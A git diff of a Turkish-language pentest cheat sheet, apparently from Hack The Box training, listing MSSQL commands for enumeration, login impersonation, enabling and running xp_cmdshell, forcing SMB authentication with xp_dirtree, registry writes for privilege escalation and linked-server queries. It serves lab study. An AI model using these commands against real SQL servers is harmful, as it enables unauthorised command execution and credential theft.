@@ -58,27 +58,79 @@ sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h
 - **SQL Authentication:** Domain veya hostname verilmezse, SQL Server içinde tanımlı kullanıcılar kullanılır.
 - **Yerel hesap:** `SERVERNAME\accountname` veya `.\accountname` şeklinde yazılır.
 
-# sqsh ile htbdbuser Oturumunda Yapılabilecekler
 
-**her komut'dan sonra `GO` ile commandı execute et** 
+## Kimlik ve Yetki Kontrolü
 
-| Komut | Ne yapar | Bu oturumda durum |
-|-------|----------|-------------------|
-| `SELECT SYSTEM_USER` | Bağlı login adını gösterir | `htbdbuser` |
-| `SELECT IS_SRVROLEMEMBER('sysadmin')` | Sysadmin mi kontrol eder (1/0) | `0`, sysadmin değil |
-| `SELECT name FROM sys.databases` | Veritabanlarını listeler | `flagDB` görünür |
-| `USE flagDB` | flagDB'ye geçer | Erişim yok (kullanıcı eşlemesi yok) |
-| `SELECT srvname, isremote FROM sysservers` | Linked server / uzak sunucuları listeler | Sadece `WINSRV02\SQLEXPRESS` (isremote=1) |
-| `SELECT ... FROM sys.server_permissions ... 'IMPERSONATE'` | Impersonation yetkisini kontrol eder | Boş, izin yok |
-| `SELECT ... FROM sys.server_role_members ...` | Sunucu rollerini gösterir | Boş, rol yok |
-| `EXEC master..xp_dirtree '\\IP\share'` | SMB üzerinden bağlantı tetikler (hash denemesi) | Hash gelmedi |
-| `EXEC master..xp_cmdshell 'whoami'` | İşletim sistemi komutu çalıştırır | Yetki yok (denenmedi, ama sysadmin değilsin) |
-| `EXEC master..xp_regread ...` | Registry okur | Yetki yok |
-| `EXEC master..xp_regwrite ...` | Registry yazar (yetki yükseltme) | Yetki yok |
-| `SELECT name, credential_identity FROM sys.credentials` | Kayıtlı credential'ları listeler | Boş |
-| `SELECT ... FROM msdb.dbo.sysjobs ...` | SQL Agent job'larını ve komutlarını listeler | Sorgu hata verdi, tekrar denenmedi |
-| `EXECUTE('...') AT [linked_server]` | Linked server üzerinde sorgu çalıştırır | Linked server yok |
+| Komut | Ne yapar | Kullanımı |
+|-------|----------|-----------|
+| `SELECT SYSTEM_USER` | Bağlı login adını gösterir | `SELECT SYSTEM_USER` |
+| `SELECT IS_SRVROLEMEMBER('sysadmin')` | Login'in sysadmin olup olmadığını gösterir (1/0) | `SELECT IS_SRVROLEMEMBER('sysadmin')` |
+| `SELECT IS_SRVROLEMEMBER('<rol>')` | Belirtilen sunucu rolünde olup olmadığını gösterir | `SELECT IS_SRVROLEMEMBER('serveradmin')` |
+| `SELECT USER_NAME()` | Mevcut veritabanındaki kullanıcı adını gösterir | `USE master` sonrası `SELECT USER_NAME()` |
 
+## Veritabanı ve Nesne Keşfi
+
+| Komut | Ne yapar | Kullanımı |
+|-------|----------|-----------|
+| `SELECT name FROM sys.databases` | Sunucudaki veritabanlarını listeler | `SELECT name FROM sys.databases` |
+| `USE <veritabanı>` | Aktif veritabanını değiştirir | `USE msdb` |
+| `SELECT name FROM sys.tables` | Aktif veritabanındaki tabloları listeler | `USE <db>` sonrası çalıştır |
+| `SELECT name FROM sys.objects WHERE type='U'` | Kullanıcı tablolarını listeler | Aktif veritabanında çalıştır |
+| `EXEC sp_helpdb` | Veritabanı ayrıntılarını (boyut, sahip) gösterir | `EXEC sp_helpdb` |
+| `EXEC sp_databases` | Erişilebilen veritabanlarını listeler | `EXEC sp_databases` |
+
+## Login, Kullanıcı ve Rol Bilgisi
+
+| Komut | Ne yapar | Kullanımı |
+|-------|----------|-----------|
+| `EXEC sp_helplogins` | Sunucudaki login'leri ve eşlemelerini gösterir | `EXEC sp_helplogins` |
+| `EXEC sp_helpuser` | Aktif veritabanındaki kullanıcıları gösterir | `USE <db>` sonrası çalıştır |
+| `EXEC sp_helpsrvrolemember` | Sunucu rollerinin üyelerini gösterir | `EXEC sp_helpsrvrolemember` |
+| `EXEC sp_helprolemember` | Veritabanı rollerinin üyelerini gösterir | `USE <db>` sonrası çalıştır |
+| `SELECT * FROM sys.server_principals` | Sunucu düzeyindeki principal'ları listeler | Tümünü ya da `WHERE type_desc='SQL_LOGIN'` ile filtrele |
+| `SELECT * FROM sys.server_permissions` | Sunucu düzeyindeki izinleri listeler | `grantee_principal_id` ile join yapılarak okunur |
+
+## Yetki ve Taklit (Impersonation)
+
+| Komut | Ne yapar | Kullanımı |
+|-------|----------|-----------|
+| `SELECT ... FROM sys.server_permissions ... WHERE permission_name='IMPERSONATE'` | Taklit izinlerini gösterir | Grantee tarafına join yaparak okunur |
+| `EXECUTE AS LOGIN = '<login>'` | Başka bir login olarak çalışmaya geçer | Önce `USE master`, sonra çalıştır |
+| `REVERT` | `EXECUTE AS` ile geçilen kimliği bırakır | Yetkiyi geri almak için kullanılır |
+
+## Komut Çalıştırma ve Sistem Erişimi
+
+| Komut | Ne yapar | Kullanımı |
+|-------|----------|-----------|
+| `EXEC sp_configure 'show advanced options', 1` + `RECONFIGURE` | Gelişmiş seçenekleri açar (sysadmin gerekir) | Önce bu, sonra aşağıdaki |
+| `EXEC sp_configure 'xp_cmdshell', 1` + `RECONFIGURE` | `xp_cmdshell`'i etkinleştirir | Sysadmin gerekir |
+| `EXEC xp_cmdshell '<komut>'` | İşletim sistemi komutu çalıştırır | `EXEC xp_cmdshell 'whoami'` |
+| `EXEC master..xp_dirtree '\\<IP>\<paylaşım>'` | Belirtilen UNC yoluna erişim tetikler | Ağ erişimi testinde kullanılır |
+| `EXEC master..xp_regread '<hive>', '<yol>', '<değer>'` | Registry değerini okur | Yetki gerektirir |
+| `EXEC master..xp_regwrite ...` | Registry'ye yazar | Sysadmin gerektirir, yetki yükseltmede kullanılır |
+
+## Linked Server
+
+| Komut | Ne yapar | Kullanımı |
+|-------|----------|-----------|
+| `SELECT srvname, isremote FROM sysservers` | Tanımlı sunucuları listeler (`isremote=0` linked server) | `SELECT srvname, isremote FROM sysservers` |
+| `EXECUTE('<sorgu>') AT [<sunucu>]` | Linked server üzerinde sorgu çalıştırır | Tek tırnak için `''` kullanılır |
+
+## SQL Agent ve Credential
+
+| Komut | Ne yapar | Kullanımı |
+|-------|----------|-----------|
+| `SELECT name, credential_identity FROM sys.credentials` | Kayıtlı credential'ları listeler | `USE master` sonrası çalıştır |
+| `SELECT j.name, s.step_name, s.command FROM msdb.dbo.sysjobs j JOIN msdb.dbo.sysjobsteps s ON j.job_id = s.job_id` | Job adlarını ve adım komutlarını gösterir | Tek satırda yaz |
+
+## Genel Oturum Komutları
+
+| Komut | Ne yapar | Kullanımı |
+|-------|----------|-----------|
+| `SELECT @@VERSION` | SQL Server sürümünü gösterir | `SELECT @@VERSION` |
+| `SELECT @@SERVERNAME` | Sunucu adını gösterir | `SELECT @@SERVERNAME` |
+| `SELECT SERVERPROPERTY('IsIntegratedSecurityOnly')` | Sadece Windows Auth modunda mı olduğunu gösterir (1/0) | `SELECT SERVERPROPERTY('IsIntegratedSecurityOnly')` |
+| `EXIT` / `QUIT` | sqsh oturumunu kapatır | `EXIT` |
 
 
 
